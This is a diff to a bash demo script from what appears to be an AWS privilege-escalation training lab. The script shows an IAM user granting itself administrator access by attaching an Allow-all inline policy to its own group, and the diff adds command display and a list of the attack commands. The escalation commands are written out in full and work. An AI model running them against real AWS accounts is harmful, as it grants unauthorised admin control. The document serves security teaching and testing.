@@ -3,7 +3,6 @@
 # Demo script for iam:PutGroupPolicy self-escalation
 # This is a USER-BASED self-escalation scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 PRIVESC_USER="pl-prod-iam-011-to-admin-paul"
@@ -52,6 +69,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $USER_IDENTITY"
 
@@ -60,12 +78,14 @@ if [[ ! $USER_IDENTITY == *"$PRIVESC_USER"* ]]; then
     exit 1
 fi
 
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Confirmed identity as $PRIVESC_USER${NC}\n"
 
 # Step 3: Verify group membership
 echo -e "${YELLOW}Step 3: Verifying $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
+show_cmd "aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text"
 GROUP_MEMBERS=$(aws iam get-group --group-name $TARGET_GROUP --query 'Users[*].UserName' --output text)
 if [[ $GROUP_MEMBERS == *"$PRIVESC_USER"* ]]; then
     echo -e "${GREEN}✓ Confirmed: $PRIVESC_USER is a member of $TARGET_GROUP${NC}"
@@ -79,6 +99,7 @@ echo ""
 # Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
     echo "The group may already have an admin policy attached from a previous run"
@@ -109,6 +130,7 @@ POLICY
 )
 
 # Put the policy on the group
+show_attack_cmd "aws iam put-group-policy --group-name $TARGET_GROUP --policy-name $POLICY_NAME --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
 aws iam put-group-policy \
     --group-name $TARGET_GROUP \
     --policy-name $POLICY_NAME \
@@ -130,6 +152,7 @@ sleep 15
 echo "Testing admin permissions (listing IAM users)..."
 SUCCESS=false
 for i in {1..3}; do
+    show_cmd "aws iam list-users --max-items 3 --output table"
     if aws iam list-users --max-items 3 --output table 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
         echo -e "${GREEN}✓ Confirmed administrator access through group policy!${NC}\n"
@@ -164,6 +187,15 @@ echo -e "  Adds admin policy to $TARGET_GROUP"
 echo -e "    ↓ (group membership)"
 echo -e "  $PRIVESC_USER gains Administrator Access"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+    echo ""
+fi
+
 echo -e "${YELLOW}Key Insight:${NC}"
 echo "This is a self-escalation attack where a user with iam:PutGroupPolicy permission"
 echo "on a group they belong to can grant themselves admin access by adding an inline"
@@ -174,3 +206,5 @@ echo "- Inline policy '$POLICY_NAME' on group $TARGET_GROUP"
 echo ""
 echo -e "${RED}⚠ Warning: The user $PRIVESC_USER now has administrator access!${NC}"
 echo "Run ./cleanup_attack.sh to remove the inline policy and restore the original state"
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
